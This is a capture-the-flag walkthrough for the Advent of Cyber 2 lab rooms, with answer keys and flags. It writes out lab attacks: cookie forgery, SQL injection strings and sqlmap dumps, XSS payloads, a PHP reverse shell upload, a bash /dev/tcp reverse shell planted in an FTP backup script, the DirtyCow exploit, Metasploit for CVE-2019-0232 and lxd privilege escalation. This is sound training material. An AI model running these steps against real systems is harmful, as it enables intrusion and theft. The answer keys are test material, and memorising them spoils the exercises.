# Advent Of Cyber 2 - Easy

1. [A Christmas Crisis](#a-christmas-crisis)
2. [The Elf Strikes Back](#the-elf-strikes-back)
3. [Christmas Chaos](#christmas-chaos)
4. [Santa's Watching](#santas-watching)
5. [Someone stole Santa's gift list](#someone-stole-santas-gift-list)
6. [Be careful with what you wish on a Christmas night](#be-careful-with-what-you-wish-on-a-christmas-night)
7. [The Grinch Really Did Steal Christmas](#the-grinch-really-did-steal-christmas)
8. [What's Under the Christmas Tree](#whats-under-the-christmas-tree)
9. [Anyone can be Santa](#anyone-can-be-santa)
10. [Don't be sElfish](#dont-be-selfish)
11. [The Rogue Gnome](#the-rogue-gnome)
12. [Ready, set, elf](#ready-set-elf)
13. [Coal for Christmas](#coal-for-christmas)
14. [Where's Rudolph](#wheres-rudolph)
15. [There's a Python in my stocking](#theres-a-python-in-my-stocking)
16. [Help! Where is Santa](#help-where-is-santa)
17. [ReverseELFneering](#reverseelfneering)
18. [The Bits of Christmas](#the-bits-of-christmas)
19. [The Naughty or Nice List](#the-naughty-or-nice-list)
20. [PowershELlf to the rescue](#powershellf-to-the-rescue)
21. [Time for some ELForensics](#time-for-some-elforensics)
22. [Elf McEager becomes CyberElf](#elf-mceager-becomes-cyberelf)
23. [The Grinch strikes again](#the-grinch-strikes-again)
24. [The Trial Before Christmas](#the-trial-before-christmas)

## A Christmas Crisis

```markdown
According to the instructions, we register by creating an account on the IP address.

Using those credentials, we log into our account.

In Developer tools, we can view more info about cookies.

Name of cookie used for authentication - auth.

Clearly, the value of this cookie is encoded in hexadecimal.

Now, after decoding the value of cookie, we get a JSON string.

Here, the string is quite predictable as all we have to do is replace the username part, and convert the JSON string to hex.

For Santa's cookie, we just need to replace the username part to 'santa' and convert to hex and remove whitespace.

Once we paste Santa's cookie value in the Developer Tools section and refresh the website, we get admin controls.

On turning everything back to normal, we get the flag required.
```

## The Elf Strikes Back

```markdown
The reference material highlights that with POST requests the data being sent is included in the "body" of the request, while with GET requests, the data is included in the URL as a "parameter".

We are also given an ID number - ODIzODI5MTNiYmYw - to gain access to upload section of site.

Once we go to the website, we are told to enter our ID as a GET parameter.

So we need to append '?id=ODIzODI5MTNiYmYw' to the URL.

This leads to the upload page. We get to know that image files are accepted by the site.

Now, on checking the page source code, we get to know that the accepted file extensions include .jpg, .jpeg and .png

So we can use a PHP reverse shell file, but rename it with the extension .jpg.php, to bypass the filter.

This file gets uploaded, and we can check the uploads in /uploads/ directory.

Set up a listener using 'nc -nvlp 1234'

Once we go to the /uploads/ directory and select the reverse shell file (with the .jpg.php extension), the page indefinitely loads.

At our netcat listener, we have received the reverse shell, and now we can view the flag at /var/www/flag.txt

Flag - THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}
```

## Christmas Chaos

```markdown
For this room, we have to use Burp Suite to brute-force and do a dictionary attack on the login form.

We have to start Burp to intercept the traffic, proxy should be turned on.

Once we are on the login form, we have to enter random credentials and submit details into the form.

The request would be captured by Proxy in Burp, and we have to forward it to Intruder, where we can do the Cluster Bomb attack as given in the reference.

Once the attack is done, we get the credentials admin:12345

Using credentials to login, we get the flag.
```

## Santa's Watching

```markdown
The reference material has given commands for tools such as gobuster and wfuzz

wfuzz command required for given URL question - wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ

Now, we need to use gobuster to find the API directory (for the given IP)
Command - gobuster dir -u http://10.10.187.195 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php

This gives us the directory /api, where we find the file site-log.php

Now, we need to fuzz the date parameter on /site-log.php, so the URL should look like /site-log.php?date=DATE

The date parameter required for fuzzing are given to us in a wordlist file.

We can use wfuzz.

Command - wfuzz -z file,wordlist --hh 0 http://10.10.187.195/api/site-log.php?date=FUZZ
Here, '--h 0' is used to hide responses with 0 characters.

As a result, we get the payload on date=20201125.

Flag - THM{D4t3_AP1}
```

## Someone stole Santa's gift list

```markdown
According to given case, we have to access the website <http://10.10.34.237:8000/> and replicate a SQLi attack.

For sqlmap, we can use this cheatsheet: <https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet>

From the clue given, we can guess that the secret login panel for the website is in /santalogin

To bypass the login, we can enter " a' or 1=1 --+ " in the password field and submit. This gives us access to the panel.

On using the search field with the payload " ' OR 1 -- - " , we find out that there are 22 entries in the database; Paul has asked for 'github ownership'.

Now, to get the complete database, we will have to use sqlmap and Burp Suite together.

Once we have access to login, we can capture the request for searching the database in /santapanel, and forward that request to Repeater; then we can save item and use sqlmap

This will give us access to the databases
```

```markdown
This is how the request in Burp Suite would look like:

GET /santapanel?search=apple HTTP/1.1
Host: 10.10.34.237:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://10.10.34.237:8000/santapanel
Cookie: session=eyJhdXRoIjp0cnVlfQ.YmU5Ww.DKmuj42iMNRkVYJNdBpNdk2zwfM
Upgrade-Insecure-Requests: 1
```

```shell
#with the request file saved, we can use sqlmap
sqlmap -r nameofrequestfile --tamper=space2comment --dbms=SQLite --dump-all
#dumps all info

#flag - thmfox{All_I_Want_for_Christmas_Is_You}
#admin password - EhCNSWzzFP6sc7gB
```

## Be careful with what you wish on a Christmas night

```markdown
OWASP ZAP, a open-source web app security scanner, can be used to scan the given website for web vulnerabilities.

Other than that, we can use XSS payloads in the website.

After trying the payloads, we can see that the website is indeed vulnerable to stored cross-site scripting.

Example of payload - <script>alert('1')</script>

Furthermore, on using search query, we can see that the parameter 'q' can be used for reflected XSS.

Example - http://10.10.233.121:5000/?q=<script>alert(document.domain)</script>

Now, we can use ZAP to scan the website and check the alerts.
```

## The Grinch Really Did Steal Christmas

```markdown
While using Wireshark for the task files, we can use filters to narrow down our search results.

For pcap1.pcap:

1. What is the IP address that initiates an ICMP/ping? - 10.11.3.2

2. If we only wanted to see HTTP GET requests, what filter would we use? - http.request.method == GET

3. Apply the filter; what is the name of the article that the IP address 10.10.67.199 visited? - reindeer-of-the-week

For pcap2.pcap:

1. From the captured FTP traffic, what password was leaked during the login process? - plaintext_password_fiasco

2. What is the name of the protocol that is encrypted? - SSH

For pcap3.pcap:

1. What is on Elf McSkidy's wishlist that will be used to replace Elf McEager? - rubber ducky

Checking the protocols used, we can see that HTTP was used.
We can see some files there.

In Wireshark, choose File > Export Objects > HTTP, and export the zip file.

In the zip file, we can view the wishlist.
```

## What's Under the Christmas Tree

```shell
nmap -T4 -Pn 10.10.16.201
#to ignore ICMP being used
#to determine if host is up

nmap -T4 -sV 10.10.16.201
#for version fingerprinting

nmap --script http-title -p 80 10.10.16.201
#to determine http-title of webserver
```

```markdown
1. When was Snort created? - 1998

2. What are the port numbers of the three services running? - 80,2222,3389

3. What is reported as the most likely distribution to be running? - Ubuntu

4. Based on the "HTTP-TITLE" value of the webserver, what might be this website used for? - blog
```

## Anyone can be Santa

```shell
ftp 10.10.202.128
#anonymous login

ls #shows all directories
#only public is accessible

cd public
#shows two files

get backup.sh

get shoppinglist.txt

quit

#in our system, we can view both the files
#now, we can reupload the backup.sh script by replacing it with malicious code
#we can use one-liners for getting a reverse shell
#bash -i >& /dev/tcp/10.17.48.136/4444 0>&1

#setup a listener
nc -nvlp 4444

#login to ftp again
ftp 10.10.202.128

cd public

put backup.sh
#in a minute, we will get access as root
#we have access now
cat flag.txt
```

```markdown
1. Name the directory on the FTP server that has data accessible by the 'anonymous' user? - public

2. What script gets executed within this directory? - backup.sh

3. What movie did Santa have on his Christmas shopping list? - The Polar Express

4. Content of flag.txt? - THM{even_you_can_be_santa}
```

## Don't be sElfish

```shell
enum4linux -h
#tool for enumerating Linux machines

enum4linux -U -S 10.10.213.77
#get possible users and shares
#shows that one of the shares doesn't require a password, so we can login

smbclient //10.10.213.77/tbfc-santa
#can login without password
```

```markdown
1. Using enum4linux, how many users are there on the Samba server? - 3

2. How many shares are there on the Samba server? - 4

3. Use smbclient to try to login to the shares on the Samba server. What share doesn't require a password? - tbfc-santa

4. Log in to this share, what directory did ElfMcSkidy leave for Santa? - jingle-tunes
```

## The Rogue Gnome

```shell
ssh cmnatic@10.10.30.56
#log into ssh using given creds

pwd

echo $0
#shows bash shell, we can try to upgrade

python3 -c 'import pty; pty.spawn("/bin/bash")'

echo $0
#/bin/bash

find / -name id_rsa 2>/dev/null
#trying to find id_rsa file

find / -perm -u=s -type f 2>/dev/null
#searching for executables with SUID bit set

#we can try uploading and running enumeration scripts
#in attacker machine
python3 -m http.server 8080

#in target machine
cd /tmp

wget http://10.17.48.136:8080/linenum.sh
#gets linenum.sh in target machine

chmod +x linenum.sh

./linenum.sh
#gives a lot of output, we've to read through the scan to find exploits
#this shows that /bin/bash has SUID bit set
#we can look up on GTFObins to find exploits

/bin/bash -p

id #we have root access now

cat /root/flag.txt
#we get the flag
```

```markdown
1. What type of privilege escalation involves using a user account to execute commands as an administrator? - Vertical

2. What is the name of the file that contains a list of users who are a part of the sudo group? - sudoers

3. What are the contents of flag.txt? - thm{2fb10afe933296592}
```

## Ready, set, elf

```shell
nmap -T4 -p- -A 10.10.176.13
#shows that host seems down, so we use -Pn

nmap -T4 -Pn -A 10.10.176.13
#gives details about web services
#gives Apache Tomcat web server version
#searching for the version vulnerability or cve shows us results

#according to given data
#we can view cgi scripts in /cgi-bin
#further, the script name is also given as elfwhacker.bat
#so /cgi-bin/elfwhacker.bat shows us details

msfconsole
#metasploit

search 2019-0232
#gives us a module

use 0
#use that module

show options

set LHOST 10.17.48.136

set RHOSTS 10.10.176.13

set TARGETURI /cgi-bin/elfwhacker.bat

show options

run
#gives us access to machine

shell
#for using system commands

dir

type flag1.txt
#from here, we can attempt privilege escalation
```

```markdown
1. What is the version number of the web server? - 9.0.17

2. What CVE can be used to create a Meterpreter entry onto the machine? - CVE-2019-0232

3. What are the contents of flag1.txt? - thm{whacking_all_the_elves}
```

## Coal for Christmas

```shell
nmap -T4 -p- -A 10.10.86.167
#lists ports, services
#we can use telnet to login

telnet 10.10.86.167 23
#gives creds santa:clauschristmas
#we can login further

#after logging in
pwd

python -c 'import pty; pty.spawn("/bin/bash")'
#upgrade to /bin/bash

ls
#shows files

cat /etc/*release
#shows distribution version

cat cookies_and_milk.txt
#shows some C source code
#portion of DirtyCow kernel exploit
#we can use the complete exploit code for privilege escalation

#in attacker machine
vim dirty.c

python3 -m http.server 8080

#in target machine
wget http://10.17.48.136:8080/dirty.c

ls

gcc -pthread dirty.c -o dirty -lcrypt
#compiles dirty.c

ls

./dirty
#runs the exploit
#we can give any password to new user
#now we can switch to this user

su firefart
#enter new password

id
#root access

cd /root

ls

cat message_from_the_grinch.txt
#run commands according to note, to get flag

touch coal

tree | md5sum
#gives flag
```

```markdown
1. What protocol and service is running? - telnet

2. What credential was left? - clauschristmas

3. What distribution of Linux and version number is this server running? - Ubuntu 12.04

4. Who got here first? - Grinch

5. What is the verbatim syntax you can use to compile? - gcc -pthread dirty.c -o dirty -lcrypt

6. What new username was created, with the default operations of the source code? - firefart

7. What is the MD5 hash output? - 8b16f00dd3b51efadb02c1df7f8427cc
```

## Where's Rudolph

```markdown
The reference material gives us a list of resources which can be used for OSINT in this case:

<https://namechk.com/>
<https://whatsmyname.app/>
<https://namecheckup.com/>
<https://github.com/WebBreacher/WhatsMyName>
<https://github.com/sherlock-project/sherlock>

Now, it's given that the Reddit username of Rudolph is 'IGuidetheClaus2020'.

On Googling the username, we can view the Reddit and Twitter profile.
```

```markdown
1. What URL will take me directly to Rudolph's Reddit comment history? - https://www.reddit.com/user/IGuidetheClaus2020/comments/

2. According to Rudolph, where was he born? - Chicago

3. Rudolph mentions Robert.  Can you use Google to tell me Robert's last name? - May

4. On what other social media platform might Rudolph have an account? - Twitter

5. What is Rudolph's username on that platform? - IGuideClaus2020
```

```markdown
Now that we have found both profiles of Rudolph, we have to use reverse image searching to find details about the photo, such as location, and other metadata.

exiftool is a great tool for getting metadata from images.

We can also use discovered emails and usernames to search through breached data to identify possible passwords, names, and other data.
```

```markdown
6. What appears to be Rudolph's favorite TV show right now? - Bachelorette

7. Based on Rudolph's post history, he took part in a parade.  Where did the parade take place? - Chicago

8. Okay, you found the city, but where specifically was one of the photos taken? - 41.891815, 87.624277

9. Did you find a flag too? - {FLAG}ALWAYSCHECKTHEEXIFD4T4

10. Has Rudolph been pwned? What password of his appeared in a breach? - spygame

11. Based on all the information gathered.  It's likely that Rudolph is in the Windy City and is staying in a hotel on Magnificent Mile.  What are the street numbers of the hotel address? - 540
```

## There's a Python in my stocking

```markdown
This is a short introduction to Python.

1. What's the output of True + True? - 2

2. What's the database for installing other peoples libraries called? - PyPi

3. What is the output of bool("False")? - True

4. What library lets us download the HTML of a webpage? - requests

5. What is the output of the given program? - [1, 2, 3, 6]

6. What causes the previous task to output that? - Pass by Reference
```

## Help! Where is Santa

```markdown
Firstly, we have to find the port number for the web server.

We can simply find it out using a nmap scan.

Now, it is given that the webpage is at 10.10.31.62/static/index.html

Going through the links in the website, we can see that one of the links points to the /api/ directory.

Now, we have to find the correct API number for the link to work.

We can use a Python script to get the response from each API number appended to the website.

Once we execute the script, we get a positive response in 10.10.31.62/api/57.
```

```python
import requests

for i in range(1,101):
    url = 'http://10.10.31.62/api/' + str(i)
    rm = requests.get(url)
    print(rm.content)
```

```markdown
1. What is the port number for the web server? - 80

2. Without using enumerations tools such as Dirbuster, what is the directory for the API? - /api/

3. Where is Santa right now? - Winter Wonderland, Hyde Park, London

4. Find out the correct API key. - 57
```

## ReverseELFneering

```shell
#logging in using given creds
ssh elfmceager@10.10.240.224

ls
#view challenge1 file

./challenge1
#does not give any output
#we can debug it

r2 -d ./challenge1
#open binary in debug mode
#in radare2 now

aa
#analysis command

afl
#list of functions

afl | grep main
#find main function

pdf @main
#print disassembly function of main
#analyze code

db 0x00400b51
#set required breakpoints

db 0x00400b62

db 0x00400b69

pdf @main
#print function to check breakpoints

dc
#execute program till breakpoint hit

pdf @main
#view rip (current instruction)

px @ rbp-0xc
#view contents of local_ch variable
#where rbp-0xc is memory address of local_ch
#this shows that local_ch value is 0

ds
#executes next instruction (next step)

px @ rbp-0xc
#now, on viewing contents of local_ch again
#we see that value is 1

#similarly, we can follow this method
#to view contents of other variables at breakpoints set

dr
#to view register contents

ds
#next step

dr
#this shows eax value as 6 now

exit
#exit radare2
```

```markdown
1. What is the value of local_ch when its corresponding movl instruction is called? - 1

2. What is the value of eax when the imull instruction is called? - 6

3. What is the value of local_4h before eax is set to 0? - 6
```

## The Bits of Christmas

```markdown
Given, we can disassemble apps created using .NET framework, using tools such as ILSpy or Dotpeek.

We can connect remotely using the command 'xfreerdp /u:cmnatic /p:Adventofcyber! /v:10.10.247.137'

After connecting, we can open the TBFC_APP in ILSpy to decompile it.

Once it loads, we can expand the resources given in the app, and start going through each element.

We come across an element named 'crackme' with more resources nested inside, we can go through them to find the password.

Once we get the password, we can submit the password to the app in order to get the flag.
```

```markdown
1. What is Santa's password? - santapassword321

2. What is the flag? - thm{046af}
```

## The Naughty or Nice List

```markdown
This challenge is a demonstration of Server-Side Request Forgery (SSRF) attacks.

Firstly we connect to the web app using the given link.

Then, we have to search some name in the website using the given field.

Once the page loads, we can see that the URL contains the parameter we entered; it can be URL-decoded for readability.

http://10.10.180.106/?proxy=http://list.hohoho:8080/search.php?name=randomname

Now, as given in the reference material, we can try to modify the URL and fetch different URLs.

We can also try to change the port numbers given in the URL.

According to the modifications, the URLs will keep showing different error messages.

For example, visiting the URL http://10.10.180.106/?proxy=http://list.hohoho:22/, gives us an error message related to the SSH port; we can infer that the SSH port 22 is open.

Following the rest of the walkthrough gives a clear idea about SSRF attacks by taking advantage of DNS subdomains in this case.
```

```markdown
1. What is Santa's password? - Be good for goodness sake!

2. What is the challenge flag? - THM{EVERYONE_GETS_PRESENTS}
```

## PowershELlf to the rescue

```powershell
#using PowerShell over SSH
#log in using given creds
ssh mceager@10.10.158.210

powershell
#launch powershell

Set-Location .\Documents\
#changing directories

Get-Help Get-ChildItem
#show help for a cmdlet

Get-ChildItem
#list contents of current directory

Get-Content .\elfone.txt
#read file

Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
#show all hidden files of current directory

Get-Content .\e1fone.txt
#gives first flag

Set-Location ..

Get-ChildItem

Set-Location .\Desktop\

Get-ChildItem -Directory -Hidden -ErrorAction SilentlyContinue
#show hidden folders in Desktop

Get-ChildItem

Get-Content .\e70smsW10Y4k.txt
#gives second flag

Set-Location ..

Set-Location ..

Set-Location ..

Set-Location ..

Get-ChildItem
#shows Windows folder

Get-Content .\Windows\

Get-ChildItem -Directory -Hidden -Recurse -ErrorAction SilentlyContinue
#shows many hidden folders
#hidden folder for elf3 in System32

Set-Location .\System32\

Get-ChildItem -Directory -Hidden -ErrorAction SilentlyContinue

Set-Location .\3lfthr3e\

Get-ChildItem
#empty

Get-ChildItem -File -Hidden -Recurse -ErrorAction SilentlyContinue
#shows 2 files

Get-Content .\1.txt | Measure-Object -Word
#shows number of words in 1.txt

(Get-Content 1.txt)[551]
#shows word at index 551 in file

(Get-Content 1.txt)[6991]

Select-String -Path .\2.txt -Pattern 'Red Ryder'
#to search pattern in file

Select-String -Path .\2.txt -Pattern 'RedRyder'
#gives final flag
```

```markdown
1. What does Elf 1 want? - 2 front teeth

2. What is the name of that movie that Elf 2 wants? - Scrooged

3. What is the name of the hidden folder? - 3lfthr3e

4. How many words does the first file contain? - 9999

5. What 2 words are at index 551 and 6991 in the first file? - Red Ryder

6. What does Elf 3 want? - red ryder bb gun
```

## Time for some ELForensics

```powershell
xfreerdp /u:littlehelper /p:iLove5now! /v:10.10.246.69
#login to system remotely using given creds

#open powershell
Get-ChildItem

Set-Location .\Documents\

Get-ChildItem

Get-Content '.\db file hash.txt'
#get contents of text file
#contains file hash for db.exe

Get-FileHash -Algorithm MD5 .\deebee.exe
#view file hash of executable

#now, to view hidden flag inside executable, we use Strings tool
C:\Tools\strings64.exe -accepteula .\deebee.exe
#Strings tool shows hints related to Alternate Data Streams

#to view ADS
Get-Item -Path .\deebee.exe -Stream *
#shows Stream and Length parameters, which includes hidedb, an ADS

#windows management instrumentation can be used to launch hidden file
wmic process call create $(Resolve-Path .\deebee.exe:hidedb)
#launches the db connector file and gives flag
```

```markdown
1. What is the file hash for db.exe? -  596690FFC54AB6101932856E6A78E3A1

2. What is the file hash of the mysterious executable within the Documents folder? - 5F037501FB542AD2D9B06EB12AED09F0

3. Using Strings find the hidden flag within the executable? - THM{f6187e6cbeb1214139ef313e108cb6f9}

4. What is the flag that is displayed when you run the database connector file? - THM{088731ddc7b9fdeccaed982b07c297c}
```

## Elf McEager becomes CyberElf

```markdown
Firstly, we have to remotely connect to the machine.
Command: xfreerdp /u:Administrator /p:'sn0wF!akes!!!' /v:10.10.206.137

Once we get access, we can see the folder with the weird name on Desktop.

We can use the CyberChef shortcut stored in C:\Tools to continue.

Now we have to decode the folder name using CyberChef. We can use the Magic recipe to decode it.

This gives us the password to the KeePass database.

After logging in, we can view the database for clues to decode the passwords as given.

We can copy the password value of the entry by Right Click > Copy Password.
Then, we have to decode it using CyberChef.

Now, for Elf Server, we get the clue 'HEXtra', which could refer to 'hexdump' option in CyberChef; on using that option, we get the decoded password.

Similarly, for Elf Mail, we get the clue 'Entities', which refers to the 'From HTML entity' option; alternatively, using the Magic recipe gives us the answer.

For the flag value, we have to check the Elf Security System notes.
The password does not have anything, the clue is in the notes.

It shows us a big list of numbers with a function. From its name, we can assume it has something to do with character codes; this is confirmed using given hint.

So, to debug this we use 'From Charcode' option, by using delimiter as Comma and Base 10.

This gives us some JavaScript code containing more character codes.

Going through the code, we can see that only one out of the two arrays of char codes is useful.

We use those character codes and decode using the previously used recipe.

This gives us a GitHub Gist link, which contains the required flag.
```

```markdown
1. What is the password to the KeePass database? - thegrinchwashere

2. What is the encoding method listed as the 'Matching ops'? - base64

3. What is the decoded password value of the Elf Server? - sn0wM4n!

4. What is the decoded password value for ElfMail? - ic3Skating!

5. What is the flag? - THM{657012dcf3d1318dca0ed864f0e70535}
```

## The Grinch strikes again

```markdown
Firstly we have to connect to the machine.
Command: xfreerdp /u:administrator /p:'sn0wF!akes!!!' /v:10.10.140.76

On the Desktop, we have to read the contents of the ransom note; the mentioned address can be decoded using CyberChef tool.

Furthermore, all the files in the system have the extension '.grinch'.

Now, using the Task Scheduler utility, we can view the two suspicious tasks.

We can view more information about them by reading the 'Triggers' and 'Actions' tabs.

After getting the required information, we have to interact with VSS using 'vssadmin' in Command Prompt.
Command: vssadmin list volumes

This shows us the volume ID we found earlier, but with a different volume name; we have to find that volume now.

Using the Disk Management utility, we can view all the partitions on the system.

The Backup partition is the volume of interest here. We can confirm by Right-Click > Properties > Security; it has the same volume ID.

We can view the volume in File Explorer by Right-Click > Change Drive Letter and Paths > Add; add any letter.

Now, we have to view the hidden files in the volume.

We can now restore the hidden folder by Right-Click > Properties > Previous Versions. The file inside the restored folder gives us the password.
```

```markdown
1. What is the plain text value of the decrypted 'address'? - nomorebestfestivalcompany

2. What is the file extension for each of the encrypted files? - .grinch

3. What is the name of the suspicious scheduled task? - opidsfsdf

4. What is the location of the executable that is run at login? - C:\Users\Administrator\Desktop\opidsfsdf.exe

5. What is the ShadowCopyVolume ID? - {7a9eea15-0000-0000-0000-010000000000}

6. What is the name of the hidden folder? - confidential

7. What is the password within the file? - m33pa55w0rdIZseecure!
```

## The Trial Before Christmas

```shell
nmap -T4 -p- -A 10.10.76.244

ffuf -u http://10.10.76.244:65000/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e .php -s
#to find hidden php page and hidden directory

nc -nvlp 1234 #listening for reverse shell connection
```

```markdown
After scanning the machine using nmap, we get the open ports.

We also get information about the websites.

The port 65000 has the secret website, so we visit that link.

Now, we can scan this website for finding the hidden php page, using ffuf.

After scanning using ffuf, we get the required php page and the directory where file uploads are saved.

For bypassing the client-side filters, we can use the reference material given to us.

After configuring Burp Suite accordingly, we hard-reload the upload page.

According to the filters, we will have to upload a reverse shell with double extension to make it work.

After getting the reverse shell we will have to get access to the database using MySQL client.
```

```shell
#to stabilize shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

#now background shell using Ctrl+Z

stty raw -echo; fg
#foregrounds the shell

#if shell dies, we can use reset command to continue
```

```shell
#to find web.txt flag
find . -name web.txt 2>/dev/null

cd /var/www

cat web.txt

#now we need to find the credentials
ls -la
#we find the credentials in one of the php files

cd TheGrid/includes

cat dbauth.php
#this gives us the required credentials
#now we can attempt to access the database

mysql -utron -p
#here, tron is the username
#we have to enter the password

show databases;
#shows db named tron

use tron;

show tables;
#shows table named users

SELECT * FROM users;
#dump users table
#we get the encrypted creds here
#on decoding, we get the creds as flynn:@computer@

exit
#exit mysql

#according to given hint, we can switch user and login using found creds
su flynn

cd home/flynn/

cat user.txt

id #shows lxd group
#it can be exploited using given walkthough

lxc image list
#view images; this shows Alpine image

lxc init Alpine mycontainer -c security.privileged=true
#initialize container

lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
#configure container

lxc start mycontainer

lxc exec mycontainer /bin/sh
#we get root access

id

cd /mnt/root/root

cat root.txt
#root flag
```

```markdown
1. What ports are open? - 80, 65000

2. What is the title of the hidden website? - Light Cycle

3. What is the name of the hidden php page? - uploads.php

4. What is the name of the hidden directory where file uploads are saved? - grid

5. What is the value of the web.txt flag? - THM{ENTER_THE_GRID}

6. What are the credentials? - tron:IFightForTheUsers

7. What is the name of the database you find the encrypted credentials in? - tron

8. What is the cracked password? - @computer@

9. What is the value of the user.txt flag? - THM{IDENTITY_DISC_RECOGNISED}

10. Which group can be leveraged to escalate privileges? - lxd

11. What is the value of the root.txt flag? - THM{FLYNN_LIVES}
```
